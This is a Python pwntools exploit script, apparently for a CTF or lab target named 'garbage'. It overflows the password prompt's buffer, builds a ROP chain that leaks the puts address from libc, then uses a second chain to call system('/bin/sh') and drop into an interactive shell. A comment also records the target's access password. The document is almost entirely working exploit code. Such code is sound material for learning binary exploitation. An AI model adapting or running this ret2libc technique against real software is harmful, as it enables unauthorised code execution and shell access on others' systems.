# Exploit author: Chris Hong 
# Date: 7/14/19
# Note: This is the buffer overflow using pwntools

#Import pwntools full library
from pwn import *
#Run in a new tmux terminal window
context(terminal=['tmux', 'new-window'])

#r = remote('10.10.10.139', 22)

#r.send("whoami")

# Run the garbage binary and set as p
p = process('./garbage')
# Set context as linux, architecture amd64
context(os="linux", arch="amd64")
log.info("Mapping binaries of garbage program")
garbage = ELF('garbage')
rop = ROP(garbage)
libc = ELF("libc.so.6")

#Output of program:

# Enter access password: N3veRF3@r1iSh3r3!
# access granted.
# [+] W0rM || Control Application
# [+] ---------------------------
# Select Option
# 1: Check Balance
# 2: Launch
# 3: Cancel
# 4: Exit
# > 4

# Overflow opportunity comes from inserting a password that is too big. 

# PART 1: Leak puts address
#=======================================================================
# Size of buffer is 135, so feeding Chris x 27 = 135 + C = 136 chars
junk = "Chris"*27 + "C"
rop.search(regs=['rdi'], order = 'regs')
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())


# Set payload equal to the junk + ROP of the program
payload = junk + str(rop)


# Sends payload immediately since first prompt is overflow opportunity
p.sendline(payload)
# Stops the exploit code to read leaked puts when the program outputs 
# 	"access denied."
p.recvuntil("denied.")
# Sets leaked_puts equal to receive and strips all but 8 chars
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
# Prints leaked puts address
log.success("Leaked puts@GLIBCL: " + str(leaked_puts))
# Converts to 64 bit
leaked_puts = u64(leaked_puts)



# PART 2 Build Rop Chain
#=======================================================================
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 ROP Chain:\n" + rop2.dump())


payload2 = junk + str(rop2)

p.sendline(payload2)

log.info("*")
log.info("*")
log.info("Successful overflow. Press <ENTER> for a shell")
# Stops program and waits for any input to proceed when generating a 
#	shell 
raw_input()
p.interactive()
